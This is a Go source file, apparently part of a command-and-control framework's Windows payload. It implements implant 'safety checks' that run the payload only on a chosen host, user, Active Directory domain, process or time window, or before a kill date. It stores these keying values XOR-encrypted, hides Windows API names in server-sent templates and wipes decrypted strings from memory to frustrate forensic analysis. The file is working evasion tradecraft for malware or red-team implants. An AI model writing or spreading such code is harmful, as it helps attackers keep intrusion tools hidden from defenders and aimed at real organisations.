// server/docker/payloads/Windows/exec_requirements_windows.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/shirou/gopsutil/v3/process"
	"golang.org/x/sys/windows"
)

// Build-time variables that will be set via ldflags (XOR encrypted)
var (
	// Safety check variables - set at build time (XOR encrypted with xorKey)
	safetyHostname       string = ""
	safetyUsername       string = ""
	safetyDomain         string = ""
	safetyFilePath       string = ""
	safetyFileMustExist  string = "false"
	safetyProcess        string = ""
	safetyKillDate       string = ""
	safetyWorkHoursStart string = ""
	safetyWorkHoursEnd   string = ""
)

// decryptSafetyValue decrypts a XOR-encrypted safety value
func decryptSafetyValue(encrypted string) string {
	if encrypted == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return ""
	}
	result := make([]byte, len(decoded))
	for i := 0; i < len(decoded); i++ {
		result[i] = decoded[i] ^ xorKey[i%len(xorKey)]
	}
	return string(result)
}

// clearString overwrites string memory to prevent recovery
func clearString(s *string) {
	if s == nil || *s == "" {
		return
	}
	// Get pointer to string header
	hdr := (*struct {
		Data uintptr
		Len  int
	})(unsafe.Pointer(s))
	if hdr.Data == 0 || hdr.Len == 0 {
		return
	}
	// Clear the backing array
	for i := 0; i < hdr.Len; i++ {
		*(*byte)(unsafe.Pointer(hdr.Data + uintptr(i))) = 0
	}
	*s = ""
}

// ExecReqTemplate stores exec requirements template strings received from server
type ExecReqTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Exec requirements template indices - must match server's common.go
// Windows-specific indices (500-549)
const (
	// DLL names
	idxExecReqDllNetapi32 = 500
	idxExecReqDllSecur32  = 501

	// Proc names
	idxExecReqProcNetGetJoinInfo = 502
	idxExecReqProcNetApiBufFree  = 503
	idxExecReqProcGetUserNameEx  = 504

	// Environment variable names
	idxExecReqEnvUsername    = 505
	idxExecReqEnvUserDnsDom  = 506
	idxExecReqEnvUserDomain  = 507
	idxExecReqEnvLogonServer = 508
	idxExecReqEnvUserProfile = 509

	// String literals
	idxExecReqWordTrue      = 510
	idxExecReqWordExe       = 511
	idxExecReqPathTildeBack = 512
	idxExecReqPathTildeFwd  = 513
	idxExecReqDoubleBacksl  = 514

	// Time format strings
	idxExecReqTimeFmtFull = 515
	idxExecReqTimeFmtDate = 516

	// Additional environment variables
	idxExecReqEnvComputername = 517

	// Cross-platform environment variable names (shared indices)
	idxExecReqEnvUser     = 307
	idxExecReqEnvLogname  = 308
	idxExecReqEnvHostname = 320
	idxExecReqEnvShell    = 321

	// System info strings (for getSystemInfo.go)
	idxExecReqSysInfoStartupTime  = 322
	idxExecReqSysInfoStatusActive = 323
)

// Global exec req template storage (uses SecureTemplate for memory zeroing)
var globalExecReqTpl *SecureTemplate

// setExecReqTemplate stores the exec requirements template (converts to SecureTemplate)
func setExecReqTemplate(tpl *ExecReqTemplate) {
	// Zero old template before replacing
	if globalExecReqTpl != nil {
		globalExecReqTpl.Zero()
	}
	globalExecReqTpl = NewSecureTemplateFromSlices(tpl.Version, tpl.Type, tpl.Templates, tpl.Params)
}

// erTpl safely retrieves a template string by index
func erTpl(idx int) string {
	return globalExecReqTpl.Get(idx)
}

// getErStr gets exec req string from template (no fallbacks - templates sent during handshake)
func getErStr(idx int) string {
	return erTpl(idx)
}

// Windows API constants
const (
	NetSetupUnknownStatus = iota
	NetSetupUnjoined
	NetSetupWorkgroupName
	NetSetupDomainName
)

var (
	modNetapi32               *windows.LazyDLL
	modSecur32                *windows.LazyDLL
	procNetGetJoinInformation *windows.LazyProc
	procNetApiBufferFree      *windows.LazyProc
	procGetUserNameExW        *windows.LazyProc
)

// initWindowsDLLs initializes the Windows DLLs using template strings
func initWindowsDLLs() {
	if modNetapi32 == nil {
		modNetapi32 = windows.NewLazySystemDLL(getErStr(idxExecReqDllNetapi32))
		modSecur32 = windows.NewLazySystemDLL(getErStr(idxExecReqDllSecur32))
		procNetGetJoinInformation = modNetapi32.NewProc(getErStr(idxExecReqProcNetGetJoinInfo))
		procNetApiBufferFree = modNetapi32.NewProc(getErStr(idxExecReqProcNetApiBufFree))
		procGetUserNameExW = modSecur32.NewProc(getErStr(idxExecReqProcGetUserNameEx))
	}
}

// NameFormat constants for GetUserNameEx
const (
	NameUnknown          = 0
	NameFullyQualifiedDN = 1
	NameSamCompatible    = 2
	NameDisplay          = 3
	NameUniqueId         = 6
	NameCanonical        = 7
	NameUserPrincipal    = 8
	NameCanonicalEx      = 9
	NameServicePrincipal = 10
	NameDnsDomain        = 12
)

// PerformSafetyChecks runs all configured safety checks
// Returns true if all checks pass, false otherwise
// Safety values are XOR encrypted - decrypt, compare, then clear from memory
func PerformSafetyChecks() bool {
	// Initialize DLLs before any checks that might need them
	initWindowsDLLs()

	// If no safety checks are configured, allow execution
	if !hasSafetyChecks() {
		return true
	}

	// Check hostname (decrypt, compare, clear)
	if safetyHostname != "" {
		expected := decryptSafetyValue(safetyHostname)
		result := checkHostname(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check username (decrypt, compare, clear)
	if safetyUsername != "" {
		expected := decryptSafetyValue(safetyUsername)
		result := checkUsername(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check domain (decrypt, compare, clear)
	if safetyDomain != "" {
		expected := decryptSafetyValue(safetyDomain)
		result := checkDomain(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check file existence (decrypt, compare, clear)
	if safetyFilePath != "" {
		path := decryptSafetyValue(safetyFilePath)
		mustExistVal := decryptSafetyValue(safetyFileMustExist)
		mustExist := mustExistVal == getErStr(idxExecReqWordTrue)
		result := checkFile(path, mustExist)
		clearString(&path)
		clearString(&mustExistVal)
		if !result {
			return false
		}
	}

	// Check process (decrypt, compare, clear)
	if safetyProcess != "" {
		expected := decryptSafetyValue(safetyProcess)
		result := checkProcess(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check kill date (decrypt, compare, clear)
	if safetyKillDate != "" {
		expected := decryptSafetyValue(safetyKillDate)
		result := checkKillDate(expected)
		clearString(&expected)
		if !result {
			return false
		}
	}

	// Check working hours (decrypt, compare, clear)
	if safetyWorkHoursStart != "" && safetyWorkHoursEnd != "" {
		start := decryptSafetyValue(safetyWorkHoursStart)
		end := decryptSafetyValue(safetyWorkHoursEnd)
		result := checkWorkingHours(start, end)
		clearString(&start)
		clearString(&end)
		if !result {
			return false
		}
	}

	return true
}

// hasSafetyChecks returns true if any safety checks are configured
func hasSafetyChecks() bool {
	return safetyHostname != "" ||
		safetyUsername != "" ||
		safetyDomain != "" ||
		safetyFilePath != "" ||
		safetyProcess != "" ||
		safetyKillDate != "" ||
		(safetyWorkHoursStart != "" && safetyWorkHoursEnd != "")
}

// checkHostname verifies the system hostname matches the expected value
func checkHostname(expected string) bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}
	return strings.EqualFold(hostname, expected)
}

// checkUsername verifies the current username matches the expected value
func checkUsername(expected string) bool {
	// Method 1: Use Windows API GetUserNameExW for SAM compatible name
	if username := getUserNameEx(NameSamCompatible); username != "" {
		// SAM format is DOMAIN\Username, extract just username
		if idx := strings.LastIndex(username, "\\"); idx >= 0 {
			username = username[idx+1:]
		}
		if strings.EqualFold(username, expected) {
			return true
		}
	}

	// Method 2: Environment variable fallback
	username := os.Getenv(getErStr(idxExecReqEnvUsername))
	if username != "" && strings.EqualFold(username, expected) {
		return true
	}

	return false
}

// getUserNameEx calls the Windows GetUserNameExW API
func getUserNameEx(nameFormat int) string {
	if procGetUserNameExW == nil {
		return ""
	}

	var size uint32 = 256
	buf := make([]uint16, size)

	ret, _, _ := procGetUserNameExW.Call(
		uintptr(nameFormat),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)),
	)

	if ret == 0 {
		return ""
	}

	return syscall.UTF16ToString(buf[:size])
}

// checkDomain checks if the machine is joined to the specified Active Directory domain
func checkDomain(expected string) bool {
	// Method 1: Use NetGetJoinInformation API (most reliable)
	if domain := getJoinedDomain(); domain != "" {
		if strings.EqualFold(domain, expected) {
			return true
		}
		// Also check if the expected is a substring (e.g., "CORP" matches "CORP.EXAMPLE.COM")
		if strings.Contains(strings.ToUpper(domain), strings.ToUpper(expected)) {
			return true
		}
	}

	// Method 2: Check USERDNSDOMAIN environment variable (set for domain users)
	if dnsDomain := os.Getenv(getErStr(idxExecReqEnvUserDnsDom)); dnsDomain != "" {
		if strings.EqualFold(dnsDomain, expected) {
			return true
		}
		if strings.Contains(strings.ToUpper(dnsDomain), strings.ToUpper(expected)) {
			return true
		}
	}

	// Method 3: Check USERDOMAIN environment variable (NetBIOS domain name)
	if userDomain := os.Getenv(getErStr(idxExecReqEnvUserDomain)); userDomain != "" {
		if strings.EqualFold(userDomain, expected) {
			return true
		}
	}

	// Method 4: Check LOGONSERVER (indicates domain controller)
	if logonServer := os.Getenv(getErStr(idxExecReqEnvLogonServer)); logonServer != "" {
		// LOGONSERVER format is \\SERVERNAME
		// If it's set and not the local machine, likely domain-joined
		hostname, _ := os.Hostname()
		serverName := strings.TrimPrefix(logonServer, getErStr(idxExecReqDoubleBacksl))
		if !strings.EqualFold(serverName, hostname) {
			// Machine is using a domain controller, check other indicators
			if userDomain := os.Getenv(getErStr(idxExecReqEnvUserDomain)); userDomain != "" {
				if strings.EqualFold(userDomain, expected) {
					return true
				}
			}
		}
	}

	return false
}

// getJoinedDomain uses NetGetJoinInformation to get the domain name
func getJoinedDomain() string {
	if procNetGetJoinInformation == nil || procNetApiBufferFree == nil {
		return ""
	}

	var nameBuffer *uint16
	var joinStatus uint32

	ret, _, _ := procNetGetJoinInformation.Call(
		0, // Local computer
		uintptr(unsafe.Pointer(&nameBuffer)),
		uintptr(unsafe.Pointer(&joinStatus)),
	)

	if ret != 0 {
		return ""
	}

	defer procNetApiBufferFree.Call(uintptr(unsafe.Pointer(nameBuffer)))

	// Only return domain name if actually joined to a domain
	if joinStatus != NetSetupDomainName {
		return ""
	}

	// Convert UTF16 pointer to Go string
	return windows.UTF16PtrToString(nameBuffer)
}

// checkFile verifies file existence based on the requirement
func checkFile(path string, mustExist bool) bool {
	// Expand environment variables in path
	path = os.ExpandEnv(path)

	// Expand ~ to user profile directory
	if strings.HasPrefix(path, getErStr(idxExecReqPathTildeBack)) || strings.HasPrefix(path, getErStr(idxExecReqPathTildeFwd)) {
		if home := os.Getenv(getErStr(idxExecReqEnvUserProfile)); home != "" {
			path = filepath.Join(home, path[2:])
		}
	}

	_, err := os.Stat(path)

	if mustExist {
		return err == nil
	} else {
		return os.IsNotExist(err)
	}
}

// checkProcess checks if a specific process is running using Windows APIs
func checkProcess(processName string) bool {
	// Normalize the process name (remove .exe if present for comparison)
	searchName := strings.TrimSuffix(strings.ToLower(processName), getErStr(idxExecReqWordExe))

	// Use gopsutil which properly uses Windows APIs internally
	processes, err := process.Processes()
	if err != nil {
		return false
	}

	for _, p := range processes {
		name, err := p.Name()
		if err != nil {
			continue
		}

		// Normalize the found process name
		foundName := strings.TrimSuffix(strings.ToLower(name), getErStr(idxExecReqWordExe))

		// Exact match
		if foundName == searchName {
			return true
		}

		// Partial match for things like "chrome" matching "chrome.exe"
		if strings.Contains(foundName, searchName) {
			return true
		}
	}

	return false
}

// checkKillDate verifies the current date is before the kill date
func checkKillDate(killDateStr string) bool {
	// Parse kill date (format: "2006-01-02 15:04:05")
	killDate, err := time.Parse(getErStr(idxExecReqTimeFmtFull), killDateStr)
	if err != nil {
		// Try alternate format without time
		killDate, err = time.Parse(getErStr(idxExecReqTimeFmtDate), killDateStr)
		if err != nil {
			return false
		}
	}

	return time.Now().Before(killDate)
}

// checkWorkingHours verifies the current time is within working hours
func checkWorkingHours(startTime, endTime string) bool {
	now := time.Now()

	// Parse start time (format: "HH:MM")
	startParts := strings.Split(startTime, ":")
	if len(startParts) != 2 {
		return false
	}

	var startHour, startMin int
	fmt.Sscanf(startParts[0], "%d", &startHour)
	fmt.Sscanf(startParts[1], "%d", &startMin)

	// Parse end time
	endParts := strings.Split(endTime, ":")
	if len(endParts) != 2 {
		return false
	}

	var endHour, endMin int
	fmt.Sscanf(endParts[0], "%d", &endHour)
	fmt.Sscanf(endParts[1], "%d", &endMin)

	// Create time objects for today with specified hours
	startToday := time.Date(now.Year(), now.Month(), now.Day(), startHour, startMin, 0, 0, now.Location())
	endToday := time.Date(now.Year(), now.Month(), now.Day(), endHour, endMin, 0, 0, now.Location())

	return now.After(startToday) && now.Before(endToday)
}
